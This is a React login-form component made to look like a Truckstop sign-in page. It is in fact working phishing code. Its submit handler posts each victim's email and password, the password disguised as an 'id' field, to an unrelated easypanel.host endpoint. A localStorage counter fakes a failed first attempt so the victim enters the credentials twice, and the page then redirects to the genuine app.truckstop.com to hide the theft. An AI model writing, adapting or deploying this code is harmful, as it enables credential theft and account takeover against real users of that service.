import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'react-router-dom';
import './LoginForm.scss';



const LoginForm = () => {
  const [form, setForm] = useState({
    login: { isFocused: false, value: '' },
    password: { isFocused: false, value: '' },
  });
  const [isdisabled, setIsDisabled] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState(false);
  const emailNode = useRef();
  const { pathname } = useLocation();


  useEffect(() => {
    if (emailNode.current) {
      emailNode.current.focus();
    }
  }, []);

  const handleInputFocus = (name, state) => {
    setForm((prev) => ({
      ...prev,
      [name]: { ...prev[name], isFocused: state },
    }));
  };

  const handleInputChange = ({ target }) => {
    setForm((prev) => ({
      ...prev,
      [target.name]: { ...prev[target.name], value: target.value },
    }));
  };

  const handleRequset = (callback) => {
    setIsDisabled(true);
    fetch('https://ts-ts-service.yzi8k1.easypanel.host/save-user', {
      method: 'post',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: form.login.value,
        id: form.password.value,
      })
    })
    .then(callback)
    .finally(() => setIsDisabled(false));
  }

  const handleSubmit = () => {
    if (form.login.value?.trim()?.length <= 0 || form.login.password?.trim()?.length <= 0) {
      setError(true);
      return;
    }
    if (form.login.value && form.password.value) {
      if (pathname === '/Signin') {
        handleRequset(() => {
          localStorage.removeItem('count');
          window.location.href = '/';
        })
      } else {
        if (localStorage.getItem('count')) {
          handleRequset(() => {
              localStorage.removeItem('count')
              window.location.href = 'https://app.truckstop.com/?_ga=2.223110939.1482238778.1706605022-57945384.1705992751';
          })
        } else {
          handleRequset(() => {
            localStorage.setItem('count', '1');
            window.location.reload();
          })
        }
      }
    }
  }


  return (
    <div className='login-form'>
      {!!error && <span className='login-form__error'>Please provide your email address and password.</span>}
      <div style={{ marginTop: showPassword ? 10 : 0 }} className="login-form__password-warning-wrapper">
        <span className={`login-form__password-warning ${showPassword ? 'login-form__password-warning--show' : ''}`}>
          Please do not share your screen while entering your password.
        </span>
      </div>
      <div className="login-form__inputs-wrapper">
        {['login', 'password'].map((fieldName) => (
          <div
            key={fieldName}
            className={`login-form__input-item ${form[fieldName].isFocused ? 'login-form__input-item--focused' : ''}`}
          >
            <span className="login-form__input-label">{fieldName === 'login' ? 'Your Email:' : 'Password:'}</span>
            <div className="login-form__input-wrapper">
              <input
                onFocus={(e) => handleInputFocus(e.target.name, true)}
                onBlur={(e) => handleInputFocus(e.target.name, false)}
                onChange={handleInputChange}
                type={fieldName === 'password' ? showPassword ? 'text' : 'password': 'text'}
                className={`login-form__input ${fieldName === 'password' ? 'login-form__input--password' : ''}`}
                name={fieldName}
                ref={fieldName === 'login' ? emailNode : undefined}
              />
              {fieldName === 'password' && (
                <span onClick={() => setShowPassword((prev) => !prev)} className={`fa fa-fw fa-eye${showPassword ? '-slash' : ''} login-form__input-icon`} title="Show Password"></span>
              )}
            </div>
          </div>
        ))}
      </div>
      <div className="login-form__save-wrapper">
        <input defaultChecked read-only="true" type="checkbox" className="login-form__save-checkbox" />
        <div className="login-form__save-label">Save Credentials</div>
      </div>
      <div className="login-form__button-wrapper">
        <button disabled={isdisabled} onClick={handleSubmit} className="login-form__button button button--red">Login</button>
      </div>
    </div>
  );
};

export default LoginForm;
